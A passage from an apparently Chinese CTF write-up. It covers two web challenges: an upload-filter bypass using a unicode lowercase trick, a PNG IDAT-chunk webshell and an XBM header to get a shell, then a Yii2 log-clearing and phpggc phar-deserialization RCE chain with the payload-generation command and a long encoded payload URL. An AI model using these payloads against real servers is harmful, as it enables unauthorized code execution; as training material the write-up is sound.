min(imagesx($first), imagesy($first));</span><br><span class="line">        $second = imagecrop($first, [<span class="string">'x'</span> =&gt; <span class="number">0</span>, <span class="string">'y'</span> =&gt; <span class="number">0</span>, <span class="string">'width'</span> =&gt; $size, <span class="string">'height'</span> =&gt; $size]);</span><br><span class="line">        <span class="keyword">if</span> ($second !== <span class="keyword">FALSE</span>) &#123;</span><br><span class="line">            $final_name = pathinfo($file)[<span class="string">"basename"</span>];</span><br><span class="line">            imagepng($second, <span class="string">'example/'</span>.$final_name);</span><br><span class="line">            imagedestroy($second);</span><br><span class="line">        &#125;</span><br><span class="line">        imagedestroy($first);</span><br><span class="line">        unlink($file);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>从压缩包解压，并对图片重新裁剪</p><p>这里有一个trick，mb_strtolower处理某些unicode字符时会有问题</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">var_dump</span>(<span class="title">mb_strtolower</span>(<span class="string">'İ'</span>)===<span class="string">'i'</span>);</span></span><br><span class="line"><span class="function"><span class="comment">//true</span></span></span><br></pre></td></tr></table></figure><p>这里stristr判断黑名单后又用mb_strtolower处理，且有二次urldecode，那么思路就很明显了，上传zip压缩包文件，然后解压getshell</p><p>常规图片马都是在末尾添加php代码，但是这里解压过后会对图片进行裁剪，导致php代码丢失，所以这里采用写入到图片数据里，即IDAT块</p><p>用这个工具生成图片马</p><p><a href="https://github.com/huntergregal/PNG-IDAT-Payload-Generator/" target="_blank" rel="noopener">https://github.com/huntergregal/PNG-IDAT-Payload-Generator/</a></p><p>更改后缀为php，然后打包进zip压缩包</p><p>这里又有一个trick，可以用下面内容绕过getimagesize</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> width 1</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> height 1</span></span><br></pre></td></tr></table></figure><p>百度了一下大概是xmb图片定义宽高的方法，可以在文件任何位置，但是必须在一行的开头（即前面必须有%0d%0a）</p><p><img src="https://image-1251466963.cos.ap-chengdu.myqcloud.com/qiniu/20210519190255.png" alt="image-20210519190247440"></p><p>成功上传</p><p><img src="https://image-1251466963.cos.ap-chengdu.myqcloud.com/qiniu/20210519190443.png" alt="image-20210519190443012"></p><p>解压</p><p><img src="https://image-1251466963.cos.ap-chengdu.myqcloud.com/qiniu/20210519190615.png" alt="image-20210519190614470"></p><p>访问getshell</p><p>同时这里记录一个坑点，我之前调试的时候使用的是2020.1版本的burpsuite，但是上传文件之后总发现文件内容被更改了，后来才发现paste from file的时候burp把一些十六进制字符比如8D直接就转换成了3F，emmm……后来换成最新版burp就没问题了，还是应该及时更新</p><h2 id="filter"><a href="#filter" class="headerlink" title="filter"></a>filter</h2><p>首先搭建一个yii环境</p><figure class="highlight dsconfig"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">composer </span><span class="built_in">create-project</span> <span class="built_in">--prefer-dist</span> <span class="string">yiisoft/</span><span class="string">yii2-app-</span><span class="string">basic </span><span class="string">my-yii</span></span><br></pre></td></tr></table></figure><p>加上提示配置</p><figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'log'</span> =&gt; [</span><br><span class="line">    <span class="string">'traceLevel'</span> =&gt; YII_DEBUG ? <span class="number">0</span> : <span class="number">0</span>,</span><br><span class="line">    <span class="string">'targets'</span> =&gt; [</span><br><span class="line">        [</span><br><span class="line">            <span class="string">'class'</span> =&gt; <span class="string">'yii\log\FileTarget'</span>,</span><br><span class="line">            <span class="string">'levels'</span> =&gt; [<span class="string">'error'</span>],</span><br><span class="line">            <span class="string">'logVars'</span> =&gt; [],</span><br><span class="line">        ],</span><br><span class="line">    ],</span><br><span class="line">],</span><br></pre></td></tr></table></figure><p>发现 <code>/runtime/logs/app.log</code>日志文件，和Laravel的差不多</p><p>题目附件里改动就这一个路由，读取文件再写入，那么整体思路应该和Laravel Debug RCE差不多，清空log文件，写入phar，然后再phar反序列化</p><p><img src="https://image-1251466963.cos.ap-chengdu.myqcloud.com/qiniu/20210520094553.png" alt="image-20210520094545426"></p><p>可以参考：<a href="https://www.anquanke.com/post/id/231459" target="_blank" rel="noopener">https://www.anquanke.com/post/id/231459</a></p><p>composer.json存在拓展monolog，phpggc刚好在版本范围内</p><p><img src="https://image-1251466963.cos.ap-chengdu.myqcloud.com/qiniu/20210520095354.png" alt="image-20210520095352214"></p><p>生成payload</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">./phpggc</span> monolog/rce2 phpinfo 1 <span class="params">--phar</span> phar -o php:<span class="string">//output</span> | base64 -w0 | python -c <span class="string">"import sys;print(''.join(['=' + hex(ord(i))[2:].zfill(2) + '=00' for i in sys.stdin.read()]).upper())"</span> &gt; payload.txt</span><br></pre></td></tr></table></figure><p>清空日志文件</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://dd60ec6c-<span class="number">4197</span>-<span class="number">4</span>c9b-<span class="number">8</span>dd0-<span class="number">8651</span>a607fa70.node3.buuoj.<span class="keyword">cn</span>/?<span class="keyword">file</span>=php://<span class="built_in">filter</span>/<span class="keyword">read</span>=consumed/resource=../<span class="keyword">runtime</span>/logs/app.<span class="built_in">log</span></span><br></pre></td></tr></table></figure><p>写入payload，注意最后面有一个a（这是为了能完整地将payload解码出来）</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://dd60ec6c-<span class="number">4197</span>-<span class="number">4</span>c9b-<span class="number">8d</span>d0-<span class="number">8651</span>a607fa70.node3.buuoj.cn/?file==<span class="number">50=00=44=00</span>=<span class="number">39=00=77=00</span>=<span class="number">61=00=48=00</span>=<span class="number">41=00=67=00</span>=<span class="number">58=00=31=00</span>=<span class="number">39=00=49=00</span>=<span class="number">51=00=55=00</span>=<span class="number">78=00=55=00</span>=<span class="number">58=00=30=00</span>=<span class="number">4</span>E=<span class="number">00=50=00=54</span>=<span class="number">00=56=00=42</span>=<span class="number">00</span>=<span class="number">4</span><span class="keyword">A</span>=<span class="number">00=54=00=45</span>=<span class="number">00=56=00=53</span>=<span class="number">00</span>=<span class="number">4</span>B=<span class="number">00</span>=<span class="number">43</span>=<span class="number">00</span>=<span class="number">6</span>B=<span class="number">00=37=00=49</span>=<span class="number">00=44=00=38</span>=<span class="number">00</span>=<span class="number">2</span>B=<span class="number">00=44=00=51</span>=<span class="number">00=71=00=36</span>=<span class="number">00=41=00=67</span>=<span class="number">00=41=00=41</span>=<span class="number">00=41=00=67</span>=<span class="number">00=41=00=41</span>=<span class="number">00=41=00=42</span>=<span class="number">00=45=00=41</span>=<span class="number">00=41=00=41</span>=<span class="number">00=41=00=42</span>=<span class="number">00=41=00=41</span>=<span class="number">00=41=00=41</span>=<span class="number">00=41=00=41</span>=<span class="number">00</span>=<span class="number">42</span>=<span class="number">00</span>=<span class="number">6</span><span class="keyword">A</span>=<span class="number">00=41=00=67</span>=<span class="number">00=41=00=41</span>=<span class="number">00</span>=<span class="number">54</span>=<span class="number">00</span>=<span class="number">7</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">6</span>F=<span class="number">00</span>=<span class="number">7</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">4</span>D=<span class="number">00</span>=<span class="number">6</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">6</span>F=<span class="number">00=69=00=54</span>=<span class="number">00=57=00=39</span>=<span class="number">00=75=00=62</span>=<span class="number">00=32=00=78</span>=<span class="number">00</span>=<span class="number">76</span>=<span class="number">00</span>=<span class="number">5</span><span class="keyword">A</span>=<span class="number">00=31=00=78</span>=<span class="number">00=49=00=59</span>=<span class="number">00=57=00=35</span>=<span class="number">00</span>=<span class="number">6</span>B=<span class="number">00=62=00=47</span>=<span class="number">00=56=00=79</span>=<span class="number">00=58=00=46</span>=<span class="number">00</span>=<span class="number">4</span>E=<span class="number">00=35=00=63</span>=<span class="number">00=32=00=78</span>=<span class="number">00</span>=<span class="number">76</span>=<span class="number">00</span>=<span class="number">5</span><span class="keyword">A</span>=<span class="number">00=31=00=56</span>=<span class="number">00</span>=<span class="number">6</span>B=<span class="number">00=63=00=45</span>=<span class="number">00=68=00=68</span>=<span class="number">00</span>=<span class="number">62</span>=<span class="number">00</span>=<span class="number">6</span>D=<span class="number">00=52=00=73</span>=<span class="number">00</span>=<span class="number">5</span><span class="keyword">A</span>=<span class="number">00=58=00=49</span>=<span class="number">00</span>=<span class="number">69</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00</span>=<span class="number">6</span><span class="keyword">A</span>=<span class="number">00=45=00=36</span>=<span class="number">00=65=00=33</span>=<span class="number">00</span>=<span class="number">4</span>D=<span class="number">00</span>=<span class="number">36</span>=<span class="number">00</span>=<span class="number">4</span>E=<span class="number">00</span>=<span class="number">6</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">6</span>F=<span class="number">00=69=00=63</span>=<span class="number">00=32=00=39</span>=<span class="number">00</span>=<span class="number">6</span><span class="keyword">A</span>=<span class="number">00=61=00=32</span>=<span class="number">00=56=00=30</span>=<span class="number">00</span>=<span class="number">49</span>=<span class="number">00</span>=<span class="number">6</span><span class="keyword">A</span>=<span class="number">00=74=00=50</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00</span>=<span class="number">6</span><span class="keyword">A</span>=<span class="number">00=49=00=35</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00</span>=<span class="number">69</span>=<span class="number">00</span>=<span class="number">4</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">4</span>E=<span class="number">00=62=00=32</span>=<span class="number">00=35=00=76</span>=<span class="number">00=62=00=47</span>=<span class="number">00</span>=<span class="number">39</span>=<span class="number">00</span>=<span class="number">6</span>E=<span class="number">00=58=00=45</span>=<span class="number">00=68=00=68</span>=<span class="number">00</span>=<span class="number">62</span>=<span class="number">00</span>=<span class="number">6</span>D=<span class="number">00=52=00=73</span>=<span class="number">00</span>=<span class="number">5</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">58</span>=<span class="number">00</span>=<span class="number">4</span><span class="keyword">A</span>=<span class="number">00=63=00=51</span>=<span class="number">00</span>=<span class="number">6</span>E=<span class="number">00</span>=<span class="number">56</span>=<span class="number">00</span>=<span class="number">6</span>D=<span class="number">00</span>=<span class="number">5</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">6</span>D=<span class="number">00=56=00=79</span>=<span class="number">00=53=00=47</span>=<span class="number">00=46=00=75</span>=<span class="number">00</span>=<span class="number">5</span><span class="keyword">A</span>=<span class="number">00=47=00=78</span>=<span class="number">00</span>=<span class="number">6</span>C=<span class="number">00=63=00=69</span>=<span class="number">00=49=00=36</span>=<span class="number">00</span>=<span class="number">4</span>E=<span class="number">00</span>=<span class="number">7</span><span class="keyword">A</span>=<span class="number">00=70=00=37</span>=<span class="number">00</span>=<span class="number">63</span>=<span class="number">00</span>=<span class="number">7</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">6</span>F=<span class="number">00</span>=<span class="number">78</span>=<span class="number">00</span>=<span class="number">4</span>D=<span class="number">00</span>=<span class="number">44</span>=<span class="number">00</span>=<span class="number">6</span>F=<span class="number">00=69=00=41</span>=<span class="number">00</span>=<span class="number">43</span>=<span class="number">00</span>=<span class="number">6</span>F=<span class="number">00=41=00=61</span>=<span class="number">00=47=00=46</span>=<span class="number">00</span>=<span class="number">75</span>=<span class="number">00</span>=<span class="number">5</span><span class="keyword">A</span>=<span class="number">00=47=00=78</span>=<span class="number">00</span>=<span class="number">6</span>C=<span class="number">00=63=00=69</span>=<span class="number">00=49=00=37</span>=<span class="number">00</span>=<span class="number">54</span>=<span class="number">00</span>=<span class="number">7</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">6</span>F=<span class="number">00</span>=<span class="number">79</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00</span>=<span class="number">54</span>=<span class="number">00</span>=<span class="number">6</span>F=<span class="number">00=69=00=54</span>=<span class="number">00=57=00=39</span>=<span class="number">00=75=00=62</span>=<span class="number">00=32=00=78</span>=<span class="number">00</span>=<span class="number">76</span>=<span class="number">00</span>=<span class="number">5</span><span class="keyword">A</span>=<span class="number">00=31=00=78</span>=<span class="number">00=49=00=59</span>=<span class="number">00=57=00=35</span>=<span class="number">00</span>=<span class="number">6</span>B=<span class="number">00=62=00=47</span>=<span class="number">00=56=00=79</span>=<span class="number">00=58=00=45</span>=<span class="number">00</span>=<span class="number">4</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">31</span>=<span class="number">00</span>=<span class="number">5</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">6</span>D=<span class="number">00</span>=<span class="number">5</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">6</span>C=<span class="number">00</span>=<span class="number">63</span>=<span class="number">00</span>=<span class="number">6</span>B=<span class="number">00=68=00=68</span>=<span class="number">00</span>=<span class="number">62</span>=<span class="number">00</span>=<span class="number">6</span>D=<span class="number">00=52=00=73</span>=<span class="number">00</span>=<span class="number">5</span><span class="keyword">A</span>=<span class="number">00=58=00=49</span>=<span class="number">00</span>=<span class="number">69</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00</span>=<span class="number">6</span><span class="keyword">A</span>=<span class="number">00=63=00=36</span>=<span class="number">00=65=00=33</span>=<span class="number">00</span>=<span class="number">4</span>D=<span class="number">00</span>=<span class="number">36</span>=<span class="number">00</span>=<span class="number">4</span>D=<span class="number">00=54=00=41</span>=<span class="number">00=36=00=49</span>=<span class="number">00=67=00=41</span>=<span class="number">00=71=00=41</span>=<span class="number">00=47=00=68</span>=<span class="number">00=68=00=62</span>=<span class="number">00</span>=<span class="number">6</span>D=<span class="number">00=52=00=73</span>=<span class="number">00</span>=<span class="number">5</span><span class="keyword">A</span>=<span class="number">00=58=00=49</span>=<span class="number">00</span>=<span class="number">69</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00=30=00=34</span>=<span class="number">00=37=00=63</span>=<span class="number">00</span>=<span class="number">7</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">6</span>F=<span class="number">00</span>=<span class="number">78</span>=<span class="number">00</span>=<span class="number">4</span>D=<span class="number">00</span>=<span class="number">7</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">6</span>F=<span class="number">00=69=00=41</span>=<span class="number">00</span>=<span class="number">43</span>=<span class="number">00</span>=<span class="number">6</span>F=<span class="number">00=41=00=59</span>=<span class="number">00</span>=<span class="number">6</span>E=<span class="number">00</span>=<span class="number">56</span>=<span class="number">00</span>=<span class="number">6</span>D=<span class="number">00</span>=<span class="number">5</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">6</span>D=<span class="number">00=56=00=79</span>=<span class="number">00=55=00=32</span>=<span class="number">00</span>=<span class="number">6</span>C=<span class="number">00</span>=<span class="number">36</span>=<span class="number">00</span>=<span class="number">5</span><span class="keyword">A</span>=<span class="number">00=53=00=49</span>=<span class="number">00=37=00=61</span>=<span class="number">00</span>=<span class="number">54</span>=<span class="number">00</span>=<span class="number">6</span>F=<span class="number">00</span>=<span class="number">74</span>=<span class="number">00</span>=<span class="number">4</span>D=<span class="number">00=54=00=74</span>=<span class="number">00</span>=<span class="number">7</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00</span>=<span class="number">6</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">6</span>B=<span class="number">00=36=00=49</span>=<span class="number">00=67=00=41</span>=<span class="number">00=71=00=41</span>=<span class="number">00</span>=<span class="number">47</span>=<span class="number">00</span>=<span class="number">4</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">31</span>=<span class="number">00</span>=<span class="number">5</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">6</span>D=<span class="number">00</span>=<span class="number">5</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">6</span>C=<span class="number">00=63=00=69</span>=<span class="number">00=49=00=37</span>=<span class="number">00=59=00=54</span>=<span class="number">00</span>=<span class="number">6</span>F=<span class="number">00</span>=<span class="number">78</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00</span>=<span class="number">6</span>E=<span class="number">00=74=00=70</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00</span>=<span class="number">6</span><span class="keyword">A</span>=<span class="number">00=41=00=37</span>=<span class="number">00=59=00=54</span>=<span class="number">00</span>=<span class="number">6</span>F=<span class="number">00</span>=<span class="number">79</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00</span>=<span class="number">6</span>E=<span class="number">00=74=00=70</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00</span>=<span class="number">6</span><span class="keyword">A</span>=<span class="number">00=41=00=37</span>=<span class="number">00</span>=<span class="number">63</span>=<span class="number">00</span>=<span class="number">7</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">6</span>F=<span class="number">00</span>=<span class="number">78</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00=69=00=49</span>=<span class="number">00=78=00=49</span>=<span class="number">00</span>=<span class="number">6</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">74</span>=<span class="number">00</span>=<span class="number">7</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00</span>=<span class="number">6</span><span class="keyword">A</span>=<span class="number">00=55=00=36</span>=<span class="number">00</span>=<span class="number">49</span>=<span class="number">00</span>=<span class="number">6</span>D=<span class="number">00</span>=<span class="number">78</span>=<span class="number">00</span>=<span class="number">6</span>C=<span class="number">00</span>=<span class="number">64</span>=<span class="number">00</span>=<span class="number">6</span>D=<span class="number">00=56=00=73</span>=<span class="number">00</span>=<span class="number">49</span>=<span class="number">00</span>=<span class="number">6</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">74</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00=33=00=31</span>=<span class="number">00=39=00=63</span>=<span class="number">00</span>=<span class="number">7</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">6</span>F=<span class="number">00</span>=<span class="number">34</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00=69=00=49</span>=<span class="number">00</span>=<span class="number">41</span>=<span class="number">00</span>=<span class="number">4</span>B=<span class="number">00=67=00=42</span>=<span class="number">00</span>=<span class="number">73</span>=<span class="number">00</span>=<span class="number">5</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">58</span>=<span class="number">00</span>=<span class="number">5</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">6</span>C=<span class="number">00=62=00=43</span>=<span class="number">00=49=00=37</span>=<span class="number">00</span>=<span class="number">54</span>=<span class="number">00</span>=<span class="number">6</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">74</span>=<span class="number">00</span>=<span class="number">7</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00</span>=<span class="number">6</span><span class="keyword">A</span>=<span class="number">00=45=00=30</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00=69=00=49</span>=<span class="number">00</span>=<span class="number">41</span>=<span class="number">00</span>=<span class="number">4</span>B=<span class="number">00=67=00=42</span>=<span class="number">00=70=00=62</span>=<span class="number">00</span>=<span class="number">6</span>D=<span class="number">00</span>=<span class="number">6</span>C=<span class="number">00=30=00=61</span>=<span class="number">00=57=00=46</span>=<span class="number">00=73=00=61</span>=<span class="number">00=58=00=70</span>=<span class="number">00</span>=<span class="number">6</span>C=<span class="number">00</span>=<span class="number">5</span><span class="keyword">A</span>=<span class="number">00=43=00=49</span>=<span class="number">00=37=00=59</span>=<span class="number">00</span>=<span class="number">6</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">6</span>F=<span class="number">00</span>=<span class="number">78</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00</span>=<span class="number">33</span>=<span class="number">00</span>=<span class="number">4</span>D=<span class="number">00</span>=<span class="number">36</span>=<span class="number">00</span>=<span class="number">4</span>D=<span class="number">00=54=00=51</span>=<span class="number">00=36=00=49</span>=<span class="number">00=67=00=41</span>=<span class="number">00=71=00=41</span>=<span class="number">00</span>=<span class="number">47</span>=<span class="number">00</span>=<span class="number">4</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">31</span>=<span class="number">00</span>=<span class="number">5</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">6</span>D=<span class="number">00</span>=<span class="number">5</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">6</span>C=<span class="number">00</span>=<span class="number">63</span>=<span class="number">00</span>=<span class="number">6</span>B=<span class="number">00=78=00=70</span>=<span class="number">00=62=00=57</span>=<span class="number">00</span>=<span class="number">6</span>C=<span class="number">00=30=00=49</span>=<span class="number">00</span>=<span class="number">6</span><span class="keyword">A</span>=<span class="number">00=74=00=70</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00=69=00=30</span>=<span class="number">00</span>=<span class="number">78</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00</span>=<span class="number">33</span>=<span class="number">00</span>=<span class="number">4</span>D=<span class="number">00</span>=<span class="number">36</span>=<span class="number">00</span>=<span class="number">4</span>D=<span class="number">00</span>=<span class="number">54</span>=<span class="number">00</span>=<span class="number">4</span>D=<span class="number">00=36=00=49</span>=<span class="number">00=67=00=41</span>=<span class="number">00=71=00=41</span>=<span class="number">00=48=00=42</span>=<span class="number">00=79=00=62</span>=<span class="number">00</span>=<span class="number">32</span>=<span class="number">00</span>=<span class="number">4</span>E=<span class="number">00</span>=<span class="number">6</span>C=<span class="number">00=63=00=33</span>=<span class="number">00</span>=<span class="number">4</span>E=<span class="number">00=76=00=63</span>=<span class="number">00</span>=<span class="number">6</span>E=<span class="number">00</span>=<span class="number">4</span>D=<span class="number">00</span>=<span class="number">69</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00=32=00=45</span>=<span class="number">00</span>=<span class="number">36</span>=<span class="number">00</span>=<span class="number">4</span>D=<span class="number">00</span>=<span class="number">6</span><span class="keyword">A</span>=<span class="number">00=70=00=37</span>=<span class="number">00=61=00=54</span>=<span class="number">00</span>=<span class="number">6</span>F=<span class="number">00</span>=<span class="number">77</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00</span>=<span class="number">33</span>=<span class="number">00</span>=<span class="number">4</span>D=<span class="number">00</span>=<span class="number">36</span>=<span class="number">00</span>=<span class="number">4</span>E=<span class="number">00</span>=<span class="number">7</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">6</span>F=<span class="number">00=69=00=59</span>=<span class="number">00=33=00=56</span>=<span class="number">00=79=00=63</span>=<span class="number">00</span>=<span class="number">6</span>D=<span class="number">00=56=00=75</span>=<span class="number">00=64=00=43</span>=<span class="number">00=49=00=37</span>=<span class="number">00=61=00=54</span>=<span class="number">00</span>=<span class="number">6</span>F=<span class="number">00</span>=<span class="number">78</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00</span>=<span class="number">33</span>=<span class="number">00</span>=<span class="number">4</span>D=<span class="number">00</span>=<span class="number">36</span>=<span class="number">00</span>=<span class="number">4</span>E=<span class="number">00</span>=<span class="number">7</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">6</span>F=<span class="number">00=69=00=63</span>=<span class="number">00=47=00=68</span>=<span class="number">00=77=00=61</span>=<span class="number">00=57=00=35</span>=<span class="number">00</span>=<span class="number">6</span>D=<span class="number">00=62=00=79</span>=<span class="number">00=49=00=37</span>=<span class="number">00=66=00=58</span>=<span class="number">00</span>=<span class="number">31</span>=<span class="number">00</span>=<span class="number">7</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00</span>=<span class="number">6</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">45</span>=<span class="number">00</span>=<span class="number">7</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00=69=00=49</span>=<span class="number">00</span>=<span class="number">41</span>=<span class="number">00</span>=<span class="number">4</span>B=<span class="number">00=67=00=42</span>=<span class="number">00=69=00=64</span>=<span class="number">00</span>=<span class="number">57</span>=<span class="number">00</span>=<span class="number">5</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">6</span>D=<span class="number">00</span>=<span class="number">5</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">58</span>=<span class="number">00</span>=<span class="number">4</span><span class="keyword">A</span>=<span class="number">00=54=00=61</span>=<span class="number">00=58=00=70</span>=<span class="number">00</span>=<span class="number">6</span>C=<span class="number">00</span>=<span class="number">49</span>=<span class="number">00</span>=<span class="number">6</span><span class="keyword">A</span>=<span class="number">00=74=00=70</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00=69=00=30</span>=<span class="number">00</span>=<span class="number">78</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00</span>=<span class="number">33</span>=<span class="number">00</span>=<span class="number">4</span>D=<span class="number">00</span>=<span class="number">36</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00</span>=<span class="number">54</span>=<span class="number">00</span>=<span class="number">6</span>F=<span class="number">00=69=00=41</span>=<span class="number">00</span>=<span class="number">43</span>=<span class="number">00</span>=<span class="number">6</span>F=<span class="number">00=41=00=59</span>=<span class="number">00</span>=<span class="number">6</span>E=<span class="number">00</span>=<span class="number">56</span>=<span class="number">00</span>=<span class="number">6</span>D=<span class="number">00</span>=<span class="number">5</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">6</span>D=<span class="number">00=56=00=79</span>=<span class="number">00</span>=<span class="number">49</span>=<span class="number">00</span>=<span class="number">6</span><span class="keyword">A</span>=<span class="number">00=74=00=68</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00</span>=<span class="number">6</span><span class="keyword">A</span>=<span class="number">00=45=00=36</span>=<span class="number">00=65=00=32</span>=<span class="number">00</span>=<span class="number">6</span>B=<span class="number">00</span>=<span class="number">36</span>=<span class="number">00</span>=<span class="number">4</span>D=<span class="number">00=44=00=74</span>=<span class="number">00</span>=<span class="number">68</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00</span>=<span class="number">6</span><span class="keyword">A</span>=<span class="number">00=49=00=36</span>=<span class="number">00=65=00=32</span>=<span class="number">00</span>=<span class="number">6</span>B=<span class="number">00</span>=<span class="number">36</span>=<span class="number">00</span>=<span class="number">4</span>D=<span class="number">00=44=00=74</span>=<span class="number">00</span>=<span class="number">7</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00</span>=<span class="number">6</span><span class="keyword">A</span>=<span class="number">00=45=00=36</span>=<span class="number">00</span>=<span class="number">49</span>=<span class="number">00</span>=<span class="number">6</span><span class="keyword">A</span>=<span class="number">00=45=00=69</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00</span>=<span class="number">33</span>=<span class="number">00</span>=<span class="number">4</span>D=<span class="number">00</span>=<span class="number">36</span>=<span class="number">00</span>=<span class="number">4</span>E=<span class="number">00</span>=<span class="number">54</span>=<span class="number">00</span>=<span class="number">6</span>F=<span class="number">00=69=00=62</span>=<span class="number">00=47=00=56</span>=<span class="number">00</span>=<span class="number">32</span>=<span class="number">00</span>=<span class="number">5</span><span class="keyword">A</span>=<span class="number">00=57=00=77</span>=<span class="number">00</span>=<span class="number">69</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00=30=00=34</span>=<span class="number">00=37=00=66</span>=<span class="number">00=58=00=31</span>=<span class="number">00</span>=<span class="number">7</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00</span>=<span class="number">6</span><span class="keyword">A</span>=<span class="number">00=67=00=36</span>=<span class="number">00=49=00=67</span>=<span class="number">00=41=00=71</span>=<span class="number">00=41=00=47</span>=<span class="number">00</span>=<span class="number">78</span>=<span class="number">00</span>=<span class="number">6</span>C=<span class="number">00</span>=<span class="number">64</span>=<span class="number">00</span>=<span class="number">6</span>D=<span class="number">00=56=00=73</span>=<span class="number">00</span>=<span class="number">49</span>=<span class="number">00</span>=<span class="number">6</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">74</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00</span>=<span class="number">33</span>=<span class="number">00</span>=<span class="number">4</span>D=<span class="number">00</span>=<span class="number">36</span>=<span class="number">00</span>=<span class="number">4</span>D=<span class="number">00=54=00=51</span>=<span class="number">00=36=00=49</span>=<span class="number">00=67=00=41</span>=<span class="number">00=71=00=41</span>=<span class="number">00</span>=<span class="number">47</span>=<span class="number">00</span>=<span class="number">6</span>C=<span class="number">00=75=00=61</span>=<span class="number">00=58=00=52</span>=<span class="number">00=70=00=59</span>=<span class="number">00=57=00=78</span>=<span class="number">00=70=00=65</span>=<span class="number">00</span>=<span class="number">6</span>D=<span class="number">00</span>=<span 